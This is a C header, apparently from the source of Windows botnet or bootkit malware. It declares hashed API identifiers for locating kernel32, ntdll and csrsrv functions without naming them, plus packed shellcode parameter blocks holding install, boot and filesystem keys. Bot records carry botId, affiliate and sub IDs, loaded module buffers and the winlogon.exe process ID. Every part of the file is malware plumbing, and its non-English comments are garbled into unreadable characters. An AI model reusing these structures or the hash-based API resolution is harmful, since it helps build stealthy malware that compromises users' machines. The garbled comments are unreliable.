#ifndef __SHELLCODE_H_
#define __SHELLCODE_H_

#define KERNEL32_DLL_HASH 0xc4aa9d02 
#define NTDLL_DLL_HASH 0x3259b431
#define CSRSRV_DLL_HASH 0xe2a937d2

#define VirtualAlloc_Hash 0x973F27BF
typedef void* (*FnVirtualAlloc)(void* lpAddress, size_t dwSize, uint32_t flAllocationType, uint32_t flProtect);

#define VirtualFree_Hash 0x785AFCB2
typedef int (*FnVirtualFree)(void* lpAddress, size_t dwSize, uint32_t dwFreeType);

#ifndef LoadLibraryA_Hash
#define LoadLibraryA_Hash 0xFA5F1697
typedef void* (*FnLoadLibraryA)(const char* lpFileName);
#endif // LoadLibraryA_Hash

#ifndef GetProcAddress_Hash
#define GetProcAddress_Hash 0xE98905D0
typedef void* (*FnGetProcAddress)(void* hModule, const char* lpProcName);
#endif // GetProcAddress_Hash

#define NtTerminateThread_Hash 0xD8FEE94E
typedef long (*FnNtTerminateThread)(void*, long);


typedef pvoid_t (*FnGetNtDLLBase)(uint32_t hashVal);
typedef pvoid_t (*FnGetFuncAddress)(uint8_t* moduleBase, uint32_t hashVal);

#define SC_RESULT_OK 0x00000001 // ������ ���� ������������ ������ � ������ ��������� ������� ������.
#define SC_RESULT_CRASH 0x40000000
#define SC_RESULT_BAD 0x80000000

#ifdef __cplusplus
extern "C" {
#endif 

#pragma pack(push, 1)

typedef struct _shellcode_block
{
    uint32_t fnGetNtDLLBase;
    uint32_t fnGetFuncAddress;
    uint8_t installKey[48];
    uint8_t bootKey[48];
    uint8_t fsKey[48];
    uint16_t osMajorVersion;    // ������� ����� ������ �������.
    uint16_t osMinorVersion;    // ������� ����� ������ �������.
    uint16_t osSPMajorVersion;  // ������� ����� ������ ������ ����.
    uint16_t osSPMinorVersion;  // ������� ����� ������ ������ ����.
    uint32_t result;            // ��������� ���������� ��������.
    uint8_t* pOutData;          // ��������� � ��������� �������� �� ������.
    uint32_t outDataSize;       // ������ ������������ ������.
    uint32_t inDataSize;
    uint8_t inData[1];
} shellcode_block_t, *pshellcode_block_t;

typedef struct _exec_info
{
    uint8_t clientId[16];
    uint8_t botId[64];
    uint32_t affId;
    uint32_t subId;
    uint32_t moduleBuffer;      // ���� ������ ������.
    uint32_t moduleSize;        // ������ ������ ������ � ������.
    uint32_t prevModuleBuffer;  // ���� ������� ������.
    uint32_t prevModuleSize;    // ������ ������� ������ � ������.
    uint32_t winlogonProcId;    // ������������� �������� winlogon.exe.
} exec_info_t, *pexec_info_t;

typedef struct _dll_info
{
    uint32_t moduleBuffer;      // ���� DLL.
    size_t moduleSize;          // ������ DLL.
} dll_info_t, *pdll_info_t;

#ifdef _WIN64

typedef struct _shellcode64_block
{
    FnGetNtDLLBase fnGetNtDLLBase;
    FnGetFuncAddress fnGetFuncAddress;
    uint8_t installKey[48];
    uint8_t bootKey[48];
    uint8_t fsKey[48];
    uint16_t osMajorVersion;    // ������� ����� ������ �������.
    uint16_t osMinorVersion;    // ������� ����� ������ �������.
    uint16_t osSPMajorVersion;  // ������� ����� ������ ������ ����.
    uint16_t osSPMinorVersion;  // ������� ����� ������ ������ ����.
    uint32_t result;            // ��������� ���������� ��������.
    uint8_t* pOutData;          // ��������� � ��������� �������� �� ������.
    uint32_t outDataSize;       // ������ ������������ ������.
    uint32_t inDataSize;
    uint8_t inData[1];
} shellcode64_block_t, *pshellcode64_block_t;

typedef struct _exec64_info
{
    uint8_t clientId[16];
    uint8_t botId[64];
    uint32_t affId;
    uint32_t subId;
    uint8_t* moduleBuffer;      // ���� ������ ������.
    uint32_t moduleSize;        // ������ ������ ������ � ������.
    uint8_t* prevModuleBuffer;  // ���� ������� ������.
    uint32_t prevModuleSize;    // ������ ������� ������ � ������.
    uint32_t winlogonProcId;    // ������������� �������� winlogon.exe.
} exec64_info_t, *pexec64_info_t;

typedef struct _dll64_info
{
    uint8_t* moduleBuffer;      // ���� DLL.
    size_t moduleSize;          // ������ DLL.
} dll64_info_t, *pdll64_info_t;

#endif // _WIN64

typedef struct _exe_block
{
    uint8_t installKey[48];
    uint8_t bootKey[48];
    uint8_t fsKey[48];
    uint8_t clientId[16/*CLIENT_ID_SIZE*/];
    uint8_t botId[64/*CLIENT_ID_SIZE*/];
    uint32_t affId;
    uint32_t subId;
} exe_block_t, *pexe_block_t;

#pragma pack(pop)

#ifdef __cplusplus
};
#endif

#endif // __SHELLCODE_H_
